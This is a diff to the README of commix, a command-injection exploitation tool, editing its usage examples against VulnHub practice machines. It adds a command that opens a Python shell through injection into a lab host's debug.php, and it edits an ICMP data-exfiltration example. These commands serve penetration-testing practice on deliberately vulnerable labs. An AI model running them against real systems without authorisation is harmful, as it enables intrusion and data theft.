@@ -122,7 +122,11 @@ Download commix by cloning the Git repository:
 
 **Exploiting [Persistence] (https://www.vulnhub.com/entry/persistence-1,103/) using ICMP exfiltration technique :**
 
-    su -c "python commix.py --url="http://192.168.178.8/debug.php" --data="addr=127.0.0.1" --icmp-exfil="ip_src=192.168.178.5,ip_dst=192.168.178.8""
+    su -c "python commix.py --url="http://192.168.178.8/debug.php" --data="addr=INJECT_HERE" --icmp-exfil="ip_src=192.168.178.5,ip_dst=192.168.178.8""
+
+**Exploiting [Persistence] (https://www.vulnhub.com/entry/persistence-1,103/) using an alternative (python) shell :**
+
+    python commix.py --url="http://192.168.178.8/debug.php" --data="addr=INJECT_HERE" --alter-shell="Python"
 
 **Exploiting [Kioptrix: 2014 (#5)] (https://www.vulnhub.com/entry/kioptrix-2014-5,62/) using custom user-agent and specified injection technique:**
 
